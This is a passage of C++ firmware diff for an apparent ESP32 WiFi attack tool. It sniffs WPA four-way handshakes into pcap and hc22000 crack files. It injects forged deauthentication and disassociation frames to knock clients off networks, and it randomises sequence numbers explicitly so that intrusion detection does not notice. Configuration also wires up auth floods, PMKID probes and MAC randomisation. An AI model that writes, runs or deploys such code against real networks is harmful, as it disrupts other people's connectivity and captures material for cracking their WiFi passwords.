+                      p.bssid[0], p.bssid[1], p.bssid[2],
+                      p.bssid[3], p.bssid[4], p.bssid[5],
+                      p.station[0], p.station[1], p.station[2],
+                      p.station[3], p.station[4], p.station[5]);
+        memset(&p, 0, sizeof(p));
+    }
+}
+
+static void rememberPending(const Slot& s, uint8_t message) {
+    if (message == 0) return;
+    uint32_t now = millis();
+    expireStalePending(now);
+    PendingCapture* p = pendingFor(s);
+    if (!p) {
+        s_cnt.framesDropped++;
+        return;
+    }
+    p->lastSeenMs = now;
+
+    uint8_t thisReplay[8];
+    extractReplay(s, thisReplay);
+
+    if (message == 1) {
+        // В§C: New M1 always refreshes вЂ” but only reset M2 if its replay
+        // no longer matches the new M1 (avoid discarding a valid pair).
+        if (!p->haveM1) {
+            // First M1 вЂ” store unconditionally.
+            p->m1 = s;
+            memcpy(p->m1Replay, thisReplay, 8);
+            p->haveM1 = true;
+            // M2 can arrive first and is held tentatively. Validate that
+            // pending frame against this first M1 before treating the pair
+            // as complete.
+            if (p->haveM2 && memcmp(p->m2Replay, thisReplay, 8) != 0) {
+                Serial.printf("[HS] first M1 replay=%02x%02x, reset mismatched tentative M2 replay=%02x%02x\n",
+                              thisReplay[6], thisReplay[7],
+                              p->m2Replay[6], p->m2Replay[7]);
+                memset(&p->m2, 0, sizeof(p->m2));
+                memset(p->m2Replay, 0, sizeof(p->m2Replay));
+                p->haveM2 = false;
+            }
+        } else if (memcmp(thisReplay, p->m1Replay, 8) != 0) {
+            // New M1 with a different replay counter (AP retried).
+            // Replace M1 and re-evaluate the stored M2.
+            p->m1 = s;
+            memcpy(p->m1Replay, thisReplay, 8);
+            // В§C: Drop stored M2 only if its replay no longer matches
+            // the new M1 вЂ” if it already matches keep the valid pair.
+            if (p->haveM2 && memcmp(p->m2Replay, thisReplay, 8) != 0) {
+                Serial.printf("[HS] new M1 replay=%02x%02x, reset mismatched M2 replay=%02x%02x\n",
+                              thisReplay[6], thisReplay[7],
+                              p->m2Replay[6], p->m2Replay[7]);
+                memset(&p->m2, 0, sizeof(p->m2));
+                memset(p->m2Replay, 0, 8);
+                p->haveM2 = false;
+            }
+            if (p->haveM3 && !replayIncremented(thisReplay, p->m3Replay)) {
+                memset(&p->m3, 0, sizeof(p->m3));
+                memset(p->m3Replay, 0, sizeof(p->m3Replay));
+                p->haveM3 = false;
+                memset(&p->m4, 0, sizeof(p->m4));
+                memset(p->m4Replay, 0, sizeof(p->m4Replay));
+                p->haveM4 = false;
+            }
+        }
+        // else: same replay, same M1 вЂ” retransmit, ignore.
+
+    } else if (message == 2) {
+        // В§B: Accept M2 only when its replay counter matches the stored M1.
+        if (!p->haveM1) {
+            // M1 not yet seen вЂ” store M2 tentatively so we don't lose it.
+            // hc22000 will do the final replay check before writing .22000.
+            if (!p->haveM2) {
+                p->m2 = s;
+                memcpy(p->m2Replay, thisReplay, 8);
+                p->haveM2 = true;
+            }
+        } else if (memcmp(thisReplay, p->m1Replay, 8) == 0) {
+            // Replay matches M1 вЂ” this is the correct M2 for this handshake.
+            p->m2 = s;
+            memcpy(p->m2Replay, thisReplay, 8);
+            p->haveM2 = true;
+        } else {
+            // Replay mismatch вЂ” this M2 belongs to a different attempt.
+            Serial.printf("[HS] M2 replay mismatch: M1=%02x%02x M2=%02x%02x вЂ” discarded\n",
+                          p->m1Replay[6], p->m1Replay[7],
+                          thisReplay[6], thisReplay[7]);
+        }
+
+    } else if (message == 3 && !p->haveM3) {
+        if (p->haveM1 &&
+        p->haveM2 &&
+        memcmp(p->m1Replay, p->m2Replay, 8) == 0 &&
+        replayIncremented(p->m1Replay, thisReplay)) {
+            p->m3 = s;
+            memcpy(p->m3Replay, thisReplay, sizeof(p->m3Replay));
+            p->haveM3 = true;
+        }
+    } else if (message == 4 && !p->haveM4) {
+        if (p->haveM3 && memcmp(p->m3Replay, thisReplay, sizeof(p->m4Replay)) == 0) {
+            p->m4 = s;
+            memcpy(p->m4Replay, thisReplay, sizeof(p->m4Replay));
+            p->haveM4 = true;
+        }
+    }
+}
+
+static bool writeFrameNow(const Slot& s) {
+    // Z-skip: ignore further EAPOL from this BSSID for the rest of the session
+    // (no pcap append, no UI "current network", no re-kick tracking).
+    if (isSessionSkipped(s.bssid)) {
+        if (s_fileOpen && sameBssid(s_fileBssid, s.bssid)) closeFile();
+        return false;
+    }
+    if (s_fileOpen && !sameBssid(s_fileBssid, s.bssid)) {
+        closeFile();
+    }
+    if (s_fileOpen && s_fileSize >= s_maxFileSize) {
+        closeFile();
+    }
+    if (!s_fileOpen) {
+        // openFileForBssid() can refuse for two reasons:
+        //   - cap on the existing file (>= configured HS FILE B) - logged inside
+        //   - too many pcaps on SD already (>= MAX_FILES) - logged inside
+        // In both cases we silently used to drop the frame WITHOUT
+        // bumping framesDropped, so the user couldn't tell from the
+        // counters that EAPOLs were being lost. Charge it here.
+        if (!openFileForBssid(s.bssid)) {
+            s_cnt.framesDropped++;
+            return false;
+        }
+    }
+    if (!writePcapPacket(s.frame, s.len, s.ts, s.channel, s.rssi, s.originalLen)) {
+        s_cnt.framesDropped++;
+        closeFile();
+        return false;
+    }
+    s_cnt.framesWritten++;
+    memcpy(s_kickBssid, s.bssid, 6);
+    memcpy(s_kickSta, s.station, 6);
+    s_kickStaOk = (s.station[0] & 0x01) == 0;
+    char ssid[33];
+    ssidForBssid(s.bssid, ssid);
+    memcpy(s_lastHsBssid, s.bssid, 6);
+    noteNetwork(s.bssid, ssid, true);
+    // Live focus for the bar: lock if armed on this BSSID, else HS/EAPOL.
+    if (bssidLocked() && memcmp(s_lockBssid, s.bssid, 6) == 0)
+        setBarTarget(1, s.bssid, ssid[0] ? ssid : nullptr);
+    else
+        setBarTarget(2, s.bssid, ssid[0] ? ssid : nullptr);
+    if (ssid[0]) {
+        strncpy(s_cnt.lastHsSsid, ssid, sizeof(s_cnt.lastHsSsid) - 1);
+        s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
+        CapName::writeCompanionSsid(Storage::DIR_HS, s_fileName, ssid);
+    }
+    return true;
+}
+
+static uint32_t pcapPacketSize(const Slot& s) {
+    uint8_t rt[Pcap::RADIOTAP_FAT_LEN];
+    uint8_t rtLen = Pcap::buildRadiotap(
+        rt, s.channel ? s.channel : s_cnt.currentChannel, s.rssi, s_fatPcap);
+    return (uint32_t)sizeof(Pcap::PacketHeader) + rtLen + s.len;
+}
+
+static void writeFrameToFile(const Slot& s) {
+    if (isSessionSkipped(s.bssid)) return;
+    Hc22000::feed(s.frame, s.len);
+    rememberPending(s, classifyPendingEapol(s));
+}
+
+static void releaseSkippedTarget(const uint8_t* bssid);
+
+static void autoSkipCapturedNetwork(const uint8_t* bssid) {
+    if (isZeroMac(bssid)) {
+        Serial.println("[CAP] cannot auto-skip completed capture with empty BSSID");
+        Display::showToast("AUTO SKIP FAILED", 1400);
+        return;
+    }
+    char ssid[33] = {0};
+    ssidForBssid(bssid, ssid);
+
+    // Block this network for the current run even if saving the persistent
+    // skip list fails; report that failure rather than implying it was saved.
+    addSkip(bssid);
+    bool saved = setStoredSkip(bssid, ssid, true);
+    releaseSkippedTarget(bssid);
+
+    if (saved) {
+        Serial.printf("[CAP] saved completed network to persistent skip: %s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
+                      ssid[0] ? ssid : "?",
+                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
+        Display::showToast("CAPTURED - SKIP SAVED", 1400);
+    } else {
+        Serial.printf("[CAP] persistent auto-skip save failed; skipped for this run only: %s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
+                      ssid[0] ? ssid : "?",
+                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
+        Display::showToast("SKIP SAVE FAILED - TEMP", 1600);
+    }
+}
+
+static void commitPendingCaptures() {
+    for (uint8_t i = 0; i < s_pendingSlots; i++) {
+        PendingCapture& p = s_pending[i];
+        if (!p.used || !p.haveM1 || !p.haveM2) continue;
+        if (memcmp(p.m1Replay, p.m2Replay, sizeof(p.m1Replay)) != 0) {
+            Serial.printf("[HS] refusing mismatched pending pair M1=%02x%02x M2=%02x%02x\n",
+                          p.m1Replay[6], p.m1Replay[7],
+                          p.m2Replay[6], p.m2Replay[7]);
+            memset(&p, 0, sizeof(p));
+            continue;
+        }
+        if (s_hsDepth >= 1 && !p.haveM3) continue;
+        if (s_hsDepth >= 2 && !p.haveM4) continue;
+        if (!Hc22000::hasHandshakeForStation(p.bssid, p.station, s_hsDepth)) continue;
+        if (!isSessionSkipped(p.bssid)) {
+            if (s_fileOpen && !sameBssid(s_fileBssid, p.bssid)) closeFile();
+            if (s_fileOpen && s_fileSize >= s_maxFileSize) closeFile();
+            if (!s_fileOpen && !openFileForBssid(p.bssid)) continue;
+            uint32_t needed = pcapPacketSize(p.m1) + pcapPacketSize(p.m2);
+            if (s_hsDepth >= 1) needed += pcapPacketSize(p.m3);
+            if (s_hsDepth >= 2) needed += pcapPacketSize(p.m4);
+            if (s_fileSize > s_maxFileSize ||
+                needed > s_maxFileSize - s_fileSize) {
+                Serial.printf("[CAP] HS depth does not fit %s (%u+%u>%u)\n",
+                              s_fileName, (unsigned)s_fileSize, (unsigned)needed,
+                              (unsigned)s_maxFileSize);
+                closeFile();
+                memset(&p, 0, sizeof(p));
+                continue;
+            }
+            bool committed = writeFrameNow(p.m1);
+            committed = committed && writeFrameNow(p.m2);
+            if (s_hsDepth >= 1) committed = committed && writeFrameNow(p.m3);
+            if (s_hsDepth >= 2) committed = committed && writeFrameNow(p.m4);
+            closeFile();
+            if (!committed) continue;
+            if (s_autoSkipCompleted)
+                autoSkipCapturedNetwork(p.bssid);
+        }
+        memset(&p, 0, sizeof(p));
+    }
+}
+
+// Runs from loop() context (via drainRing) вЂ” safe to do SD I/O here.
+static void processPendingSsidLearn() {
+    // Atomically claim the pending-learn entry. Taking the flag and
+    // copying the BSSID under the same critical section guarantees we
+    // hand back the BSSID that was paired with the flag we just cleared
+    // вЂ” otherwise storeBeacon() (IRAM, can preempt us here) could
+    // overwrite s_pendingLearnBssid with a new entry between our read
+    // and copy, and we'd process the wrong BSSID.
+    uint8_t bssid[6];
+    portENTER_CRITICAL(&s_pendingMux);
+    if (!s_pendingLearn) {
+        portEXIT_CRITICAL(&s_pendingMux);
+        return;
+    }
+    s_pendingLearn = false;
+    memcpy(bssid, s_pendingLearnBssid, 6);
+    portEXIT_CRITICAL(&s_pendingMux);
+    BeaconSlot beacon;
+    if (!copyBeacon(bssid, beacon) || !beacon.ssid[0]) return;
+
+    char hiddenStem[40], hiddenName[Storage::FILE_NAME_MAX], hiddenPath[80];
+    CapName::buildStem("", bssid, hiddenStem, sizeof(hiddenStem));
+    snprintf(hiddenName, sizeof(hiddenName), "%s.pcap", hiddenStem);
+    snprintf(hiddenPath, sizeof(hiddenPath), "%s%s", PREFIX, hiddenName);
+    if (!SD.exists(hiddenPath)) return; // nothing was ever written under HIDDEN
+
+    // Same file we're actively streaming into вЂ” close it before renaming.
+    if (s_fileOpen && sameBssid(s_fileBssid, bssid)) closeFile();
+
+    char newName[Storage::FILE_NAME_MAX], newPath[80];
+    makeFilename(bssid, newName);
+    snprintf(newPath, sizeof(newPath), "%s%s", PREFIX, newName);
+    if (strcmp(hiddenPath, newPath) == 0) return; // name didn't actually change
+    if (SD.exists(newPath)) return;               // don't clobber an existing file
+
+    if (!SD.rename(hiddenPath, newPath)) {
+        Serial.printf("[CAP] rename %s -> %s failed\n", hiddenName, newName);
+        return;
+    }
+    Serial.printf("[CAP] %s -> %s (ssid learned)\n", hiddenName, newName);
+
+    // Splice the SSID-revealing frame into the renamed pcap. Without this,
+    // Hc22000::convertPcap() run later on this file would still see nothing
+    // but the original hidden beacon and could never rebuild a crackable hash.
+    File f = SD.open(newPath, "a");
+    if (!f) return;
+    uint8_t rt[Pcap::RADIOTAP_FAT_LEN];
+    uint8_t rtLen = Pcap::buildRadiotap(rt, beacon.channel, beacon.rssi, s_fatPcap);
+    Pcap::PacketHeader ph;
+    uint32_t ts = millis();
+    ph.tsSec   = ts / 1000;
+    ph.tsUsec  = (ts % 1000) * 1000;
+    ph.inclLen = (uint32_t)(rtLen + beacon.len);
+    ph.origLen = ph.inclLen;
+    size_t currentSize = f.size();
+    size_t packetSize = sizeof(ph) + rtLen + beacon.len;
+    if (currentSize + packetSize > s_maxFileSize) {
+        Serial.printf("[CAP] SSID beacon does not fit limit: %s (%u/%u)\n",
+                      newName, (unsigned)currentSize, (unsigned)s_maxFileSize);
+        f.close();
+        return;
+    }
+    size_t written = 0;
+    written += f.write((uint8_t*)&ph, sizeof(ph));
+    written += f.write(rt, rtLen);
+    written += f.write(beacon.frame, beacon.len);
+    f.close();
+    if (written != packetSize) {
+        Serial.printf("[CAP] short SSID beacon write: %s (%u/%u)\n",
+                      newName, (unsigned)written, (unsigned)packetSize);
+    }
+}
+
+static void drainRing() {
+    // Process any pending "SSID just learned for a hidden BSSID" rename
+    // FIRST, before writing this tick's queued frames. makeFilename() (via
+    // ssidForBssid()) reads the SSID straight out of the live beacon table,
+    // which storeBeacon() updates the INSTANT a beacon reveals it - not
+    // when the rename actually runs. If we wrote frames first: an EAPOL
+    // for a BSSID whose SSID was JUST learned would already compute the
+    // new (real-name) path in openFileForBssid(), find nothing there yet,
+    // and start a brand-new file - while the earlier frames for that same
+    // BSSID stay stranded under the old hidden-name file. The pending
+    // rename then refuses to run (its target name already exists), so the
+    // capture stays permanently split across two incomplete files. Doing
+    // the rename first means any name that's about to change has already
+    // changed by the time we compute paths for this tick's frames.
+    processPendingSsidLearn();
+    // Beacon frames are kept in the callback-owned table rather than the
+    // EAPOL ring. Feed them from loop context so Hc22000 learns the ESSID
+    // before flushPending()/commitPendingCaptures() checks readiness.
+    uint8_t beaconCount;
+    portENTER_CRITICAL(&s_beaconMux);
+    beaconCount = s_beaconCount;
+    portEXIT_CRITICAL(&s_beaconMux);
+    for (uint8_t i = 0; i < beaconCount; i++) {
+        BeaconSlot beacon;
+        bool feed = false;
+        portENTER_CRITICAL(&s_beaconMux);
+        if (i < s_beaconCount && s_beacons[i].len > 0 && !s_beacons[i].processed) {
+            beacon = s_beacons[i];
+            s_beacons[i].processed = true;
+            feed = true;
+        }
+        portEXIT_CRITICAL(&s_beaconMux);
+        if (feed) Hc22000::feed(beacon.frame, beacon.len);
+    }
+    while (s_read != s_write) {
+        const Slot& s = s_ring[s_read];
+        // Checklist: feed() from loop context ONLY
+        writeFrameToFile(s);
+        s_read = (uint8_t)((s_read + 1) % s_ringSlots);
+    }
+    if (s_fileOpen) s_file.flush();
+}
+
+static bool isOwnAp(const uint8_t* bssid) {
+    return memcmp(bssid, s_apMac, 6) == 0;
+}
+
+static bool skipPin(const uint8_t* bssid) {
+    return s_pinOk && memcmp(bssid, s_pinBssid, 6) != 0;
+}
+
+// Per-BSSID sequence counter for injected mgmt frames. A static seq=0 on every
+// frame is an easy tell for a WIDS/packet capture and some APs rate-limit or
+// drop obviously-replayed sequence numbers; incrementing per destination
+// mimics a real, ongoing 802.11 session.
+struct SeqEntry { uint8_t bssid[6]; uint16_t seq; bool used; };
+static SeqEntry s_seqTable[16];
+
+static uint16_t nextSeq(const uint8_t* bssid) {
+    for (uint8_t i = 0; i < 16; i++) {
+        if (s_seqTable[i].used && memcmp(s_seqTable[i].bssid, bssid, 6) == 0) {
+            s_seqTable[i].seq = (uint16_t)((s_seqTable[i].seq + 1) & 0x0FFF);
+            return s_seqTable[i].seq;
+        }
+    }
+    for (uint8_t i = 0; i < 16; i++) {
+        if (!s_seqTable[i].used) {
+            memcpy(s_seqTable[i].bssid, bssid, 6);
+            s_seqTable[i].seq = (uint16_t)(esp_random() & 0x0FFF);
+            s_seqTable[i].used = true;
+            return s_seqTable[i].seq;
+        }
+    }
+    return (uint16_t)(esp_random() & 0x0FFF);
+}
+
+static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid, const uint8_t* dest) {
+    uint8_t pkt[26] = {
+        fc0, 0x00,
+        0x00, 0x00,
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00,
+        0x07, 0x00
+    };
+    memcpy(pkt + 4, dest, 6);
+    memcpy(pkt + 10, bssid, 6);
+    memcpy(pkt + 16, bssid, 6);
+    uint16_t seq = nextSeq(bssid);
+    pkt[22] = (uint8_t)((seq << 4) & 0xF0);
+    pkt[23] = (uint8_t)((seq >> 4) & 0xFF);
+    pkt[24] = s_deauthReason;
+    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
+    if (e != ESP_OK) e = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+    if (e == ESP_OK) s_cnt.framesDeauth++;
+}
+
+static Methods::Ctx buildMethodCtx() {
+    Methods::Ctx ctx{};
+    portENTER_CRITICAL(&s_beaconMux);
+    uint8_t count = s_beaconCount;
+    for (uint8_t i = 0; i < count; i++) {
+        const BeaconSlot& src = s_beacons[i];
+        Methods::BeaconView& dst = s_methodBeacons[i];
+        memcpy(dst.bssid, src.bssid, sizeof(dst.bssid));
+        dst.channel = src.channel;
+        dst.rssi = src.rssi;
+        memcpy(dst.ssid, src.ssid, sizeof(dst.ssid));
+        memcpy(dst.clients, src.clients, sizeof(dst.clients));
+        dst.clientN = src.clientN;
+        dst.pmfCapable = src.pmfCapable;
+        dst.dataRecent = src.dataRecent;
+    }
+    portEXIT_CRITICAL(&s_beaconMux);
+    ctx.beacons      = s_methodBeacons;
+    ctx.beaconCount   = count;
+    ctx.channel       = s_cnt.currentChannel;
+    ctx.minRssi       = s_minRssi;
+    ctx.kickBurst     = s_kickBurst;
+    ctx.deauthReason  = s_deauthReason;
+    ctx.bidirKick     = s_bidirKick;
+    ctx.eapolTx       = s_eapolTx;
+    ctx.pmkidProbe    = s_pmkidProbe;
+    ctx.csaHerd       = s_csaHerd;
+    ctx.authFlood     = s_authFlood;
+    ctx.kickBssid     = s_kickBssid;
+    ctx.kickSta       = s_kickSta;
+    ctx.kickStaOk     = s_kickStaOk;
+    ctx.bcast         = s_bcast;
+    ctx.isOwnAp       = isOwnAp;
+    ctx.skipPin       = skipPin;
+    ctx.isSkipped     = isSessionSkipped;
+    ctx.sendRawMgmt   = sendRawMgmt;
+    ctx.framesDeauth  = &s_cnt.framesDeauth;
+    // Porkchop-style knobs - methods that don't read these just ignore
+    // them, no behavior change. PORKCHOP method picks them up.
+    ctx.jitterMs      = s_jitterMs;
+    ctx.cooldownSec   = s_cooldownSec;
+    ctx.scoreThr      = s_scoreThr;
+    ctx.dwellMinMs    = s_dwellMinMs;
+    ctx.hsDepth       = s_hsDepth;
+    // Lock-on-BSSID focus: pass the parked target to scoring methods so
+    // they don't drift to a higher-scoring neighbor while we wait for
+    // M2/M3/M4. Methods that don't read lockedBssid* (OURS, PAN, CSA,
+    // PMKID) are unaffected.
+    if (bssidLocked() && !isZeroMac(s_lockBssid)) {
+        memcpy(ctx.lockedBssid, s_lockBssid, 6);
+        ctx.lockedBssidActive = true;
+    } else {
+        ctx.lockedBssidActive = false;
+    }
+    ctx.dataAct       = s_dataAct;
+    ctx.strictLock    = s_strictLock;
+    ctx.depthHoldSec  = s_depthHoldSec;
+    ctx.txPowerDb     = s_txPowerDb;
+    ctx.burstPattern  = s_burstPattern;
+    return ctx;
+}
+
+static void kickOnThisChannel() {
+    if (!s_deauthEnabled) return;
+    if (Hc22000::shouldPauseDeauth()) return;
+    if (s_pinOk && isSessionSkipped(s_pinBssid)) return;
+    const Methods::Entry* tbl = methodTable();
+    uint8_t idx = s_activeMethod < s_methodCount ? s_activeMethod : 0;
+    const Methods::Entry& m = tbl[idx];
+    if (s_pinOk) {
+        BeaconSlot pinnedBeacon;
+        bool seen = copyBeacon(s_pinBssid, pinnedBeacon);
+        if (!seen) {
+            // Pinned target hasn't shown up in any beacon yet. In
+            // STEALTH-like packs (bidirKick=false, authFlood=false) we
+            // MUST NOT broadcast deauth into the void - that would
+            // blow the user's stealth even though we don't even know
+            // the target is on this channel. Same rule as the global
+            // guard in method_porkchop.cpp: "no deauth at all" means
+            // "no deauth at all", even from the sniffer's pinned-fallback
+            // path. PMKID-probe below is fine to keep going (it's not
+            // a deauth), gated on s_pmkidProbe + known SSID.
+            bool pinnedStealth = !s_bidirKick && !s_authFlood;
+            if (!pinnedStealth) {
+                uint8_t rounds = s_kickBurst ? s_kickBurst : 1;
+                for (uint8_t r = 0; r < rounds; r++) {
+                    sendRawMgmt(0xC0, s_pinBssid, s_bcast);
+                    delay(WSLBypasser::burstLegGapMs());
+                    sendRawMgmt(0xA0, s_pinBssid, s_bcast);
+                    if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
+                }
+            }
+            if (m.probe && s_pmkidProbe && s_pinSsid[0] &&
+                !Hc22000::hasPair(s_pinBssid)) {
+                WSLBypasser::sendAuthentication(s_pinBssid);
+                WSLBypasser::sendAssociationRequest(s_pinBssid, s_pinSsid);
+            }
+        }
+    }
+    Methods::Ctx ctx = buildMethodCtx();
+    if (m.kick) m.kick(ctx);
+    if (m.probe) m.probe(ctx);
+}
+
+static void maybeRotateMethod() {
+    if (s_hsMethod != (uint8_t)HsMethod::AUTO) return;
+    if (s_methodCount < 2) return; // nothing to rotate through
+    uint16_t pairs = Hc22000::pairCount();
+    if (pairs > s_pairAtSwitch) {
+        s_pairAtSwitch = pairs;
+        s_methodStartMs = millis();
+        return;
+    }
+
+    uint32_t waitMs = (uint32_t)s_fallbackSec * 1000u;
+    if (waitMs < 10000) waitMs = 10000;
+    if (millis() - s_methodStartMs < waitMs) return;
+    // Round-robin through every method in the table. The first entry is
+    // the AUTO default; every other entry gets a turn after fallbackSec.
+    s_activeMethod = (uint8_t)((s_activeMethod + 1) % s_methodCount);
+    s_methodStartMs = millis();
+    s_pairAtSwitch = pairs;
+    setMethodTag();
+    Serial.printf("[CAP] AUTO switch -> %s\n", s_cnt.methodTag);
+}
+
+static void decayBeaconActivity(uint32_t now) {
+    if (!s_dataAct || now - s_lastBeaconDecayMs < 1000) return;
+    s_lastBeaconDecayMs = now;
+    portENTER_CRITICAL(&s_beaconMux);
+    for (uint8_t i = 0; i < s_beaconCount; i++)
+        s_beacons[i].dataRecent >>= 1;
+    portEXIT_CRITICAL(&s_beaconMux);
+}
+
+void begin() {
+    Storage::begin();
+    Storage::ensureDir(Storage::DIR_HS);
+    Storage::ensureDir(Storage::DIR_WPASEC);
+    Storage::ensureDir(Storage::DIR_PWNCRACK);
+    Storage::ensureDir(Storage::DIR_OHC);
+    s_cnt = {};
+    s_write = 0;
+    s_read  = 0;
+    s_running = false;
+    s_mode = RunMode::Off;
+    s_beaconCount = 0;
+    Hc22000::reset();
+}
+
+static void startCommon(RunMode mode) {
+    bool sdOk = Storage::begin();
+    if (!sdOk) Serial.println("[CAP] SD missing - EAPOL counted, files may fail");
+
+    if (s_running) stop();
+    if (!ensureSkipMemory()) {
+        s_mode = RunMode::Off;
+        return;
+    }
+    if (!s_storedSkipsLoaded || sdOk) loadStoredSkips();
+    s_ringSlots = Config::radio().ringSlots;
+    // MEMFIX: the RADIO menu offers RING 4..32 in steps of 1, but this clamp
+    // used to accept only {4,8,12,16,24,28} and silently reset every other
+    // value to 12 вЂ” the knob appeared to work and did nothing. Now that a
+    // ring slot is 536 B (EAPOL_FRAME_MAX) instead of 1124 B, the whole
+    // 4..32 range is affordable, so take the menu value as-is.
+    if (s_ringSlots < 4 || s_ringSlots > 32) s_ringSlots = 12;
+    s_pendingSlots = Config::radio().pendingSlots;
+    if (s_pendingSlots < 4 || s_pendingSlots > 16 || (s_pendingSlots & 1u))
+        s_pendingSlots = 4;
+    if (!allocateCaptureMemory()) {
+        Serial.println("[CAP] capture buffers allocation failed");
+        releaseSkipMemory();
+        s_mode = RunMode::Off;
+        return;
+    }
+    if (!Hc22000::allocateMemory()) {
+        Serial.println("[CAP] 22000 table allocation failed");
+        delete[] s_ring;
+        delete[] s_pending;
+        delete[] s_beacons;
+        s_ring = nullptr;
+        s_pending = nullptr;
+        s_beacons = nullptr;
+        releaseSkipMemory();
+        s_mode = RunMode::Off;
+        return;
+    }
+    Hc22000::reset();
+
+    s_write = 0;
+    s_read = 0;
+    memset(s_pending, 0, sizeof(PendingCapture) * s_pendingSlots);
+    s_cnt = {};
+    memset(s_seqTable, 0, sizeof(s_seqTable));
+    s_pendingLearn = false;
+    s_cnt.currentBssid[0] = 0;
+    s_cnt.currentSsid[0] = 0;
+    s_cnt.lastHsSsid[0] = 0;
+    memset(s_lastHsBssid, 0, sizeof(s_lastHsBssid));
+    memset(s_fullLoggedBssid, 0, sizeof(s_fullLoggedBssid));
+    s_lastHopMs = millis();
+    s_channelIdx = 0;
+    s_lockUntil = 0;
+    disarmLockOnBssid();
+    s_kickStaOk = false;
+    // Drop the beacon table from any previous session. Without this, methods
+    // like PORKCHOP keep scoring stale clients/APs (BeaconSlot::clientN,
+    // lastSeenMs, EMA score from the previous run) and can chase ghosts
+    // on the new channel. begin() also zeros these for the very first run;
+    // this keeps the stop()/startCommon() cycle symmetric.
+    s_beaconCount = 0;
+    s_beaconClock = 0;
+    s_lastBeaconDecayMs = millis();
+    clearSkipList();
+    s_skipKeyWas = false;
+    s_skipMenuOpen = false;
+    s_skipMenuQWas = false;
+    s_mode = mode;
+    s_hopEnabled = (mode == RunMode::Light || mode == RunMode::Aggressive);
+    s_deauthEnabled = (mode != RunMode::Light) && Config::radio().deauth;
+    if (mode != RunMode::Pinned) {
+        s_pinOk = false;
+        memset(s_pinBssid, 0, sizeof(s_pinBssid));
+        s_pinSsid[0] = 0;
+    }
+    s_lockOnHs = Config::radio().lockOnHs;
+    s_lockMs = Config::radio().lockMs;
+    s_hopMs = Config::radio().hopMs;
+    s_minRssi = Config::radio().minRssi;
+    s_hopSet = Config::radio().hopSet;
+    s_hsMethod = Config::radio().hsMethod;
+    s_fallbackSec = Config::radio().fallbackSec;
+    s_kickBurst = Config::radio().kickBurst;
+    s_bidirKick = Config::radio().bidirKick;
+    s_eapolTx = Config::radio().eapolTx;
+    s_pmkidProbe = Config::radio().pmkidProbe;
+    s_csaHerd = Config::radio().csaHerd;
+    s_authFlood = Config::radio().authFlood;
+    s_deauthReason = Config::radio().deauthReason;
+    s_fatPcap = Config::radio().fatPcap;
+    uint16_t hsFileBytes = Config::radio().hsFileBytes;
+    if (hsFileBytes != 1024 && hsFileBytes != 2048 &&
+        hsFileBytes != 4096 && hsFileBytes != 8192)
+        hsFileBytes = 2048;
+    s_maxFileSize = hsFileBytes;
+    // Porkchop-style knobs.
+    s_jitterMs = Config::radio().jitterMs;
+    s_cooldownSec = Config::radio().cooldownMs;
+    s_scoreThr = Config::radio().scoreThr;
+    s_dwellMinMs = Config::radio().dwellMinMs;
+    s_hsDepth = Config::radio().hsDepth;
+    if (s_hsDepth > 2) s_hsDepth = 2;
+    s_autoSkipCompleted = Config::radio().autoSkipCompleted;
+    if (s_dwellMinMs > 0 && s_dwellMinMs < 50) s_dwellMinMs = 50;
+    if (s_dwellMinMs > 600) s_dwellMinMs = 600;
+    s_dataAct = Config::radio().dataAct != 0;
+    s_strictLock = Config::radio().strictLock;
+    s_depthHoldSec = Config::radio().depthHoldSec;
+    if (s_depthHoldSec > 30) s_depthHoldSec = 30;
+    s_txPowerDb = Config::radio().txPowerDb;
+    s_burstPattern = Config::radio().burstPattern;
+    // Apply injected-frame TX power + burst shaping once per capture session.
+    WSLBypasser::setTxPowerDb(s_txPowerDb);
+    WSLBypasser::setBurstPattern(s_burstPattern);
+    // AUTO starts on table index 0 and rotates via maybeRotateMethod().
+    if (s_methodCount == 0) methodTable(); // populate s_methodCount
+    // s_hsMethod on-disk layout: 0 = AUTO, 1..N = Methods::name(idx-1).
+    // This must match hsMethodName()/hsMethodIndex() (settings_menu.cpp,
+    // config.cpp) exactly, or the method the user picked in the Radio menu
+    // (which can be ANY registered method, not just OURS/PAN) silently
+    // resolves to table index 0 instead - that's what caused the bottom
+    // bar's P:/M: tags to disagree with what was actually running.
+    if (s_hsMethod == (uint8_t)HsMethod::AUTO || s_methodCount == 0) {
+        s_activeMethod = 0;
+    } else {
+        uint8_t idx = (uint8_t)(s_hsMethod - 1);
+        s_activeMethod = (idx < s_methodCount) ? idx : 0;
+    }
+    s_methodStartMs = millis();
+    s_pairAtSwitch = Hc22000::pairCount();
+    Methods::resetAll();
+    setMethodTag();
+    if (s_hopMs < 50) s_hopMs = 50;
+
+    // SoftAP iface must exist or 802.11 TX / promiscuous often stay dead
+    // after the boot fence left WIFI_OFF.
+    WiFi.persistent(false);
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.setSleep(false);
+    uint8_t hopN = 0;
+    const uint8_t* hops = hopTable(&hopN);
+    uint8_t startCh = 6;
+    if (s_hopEnabled) startCh = hops[0];
+    else if (mode == RunMode::Pinned && s_pinCh >= 1 && s_pinCh <= 13) startCh = s_pinCh;
+    const char* apName = (mode == RunMode::Aggressive) ? "OneLPig AGG"
+                       : (mode == RunMode::Pinned) ? "OneLPig PIN" : "OneLPig";
+    if (Config::radio().randomMac) WSLBypasser::randomizeMAC();
+    bool apOk = WiFi.softAP(apName, "onelpig123", startCh, 1 /* hidden */, 4);
+    delay(80);
+    WiFi.softAPmacAddress(s_apMac);
+    Serial.printf("[CAP] wifi AP+STA hidden=%s ch=%u ap=%s\n",
+                  apName, (unsigned)startCh, apOk ? "ok" : "fail");
+
+    wifi_promiscuous_filter_t filt{};
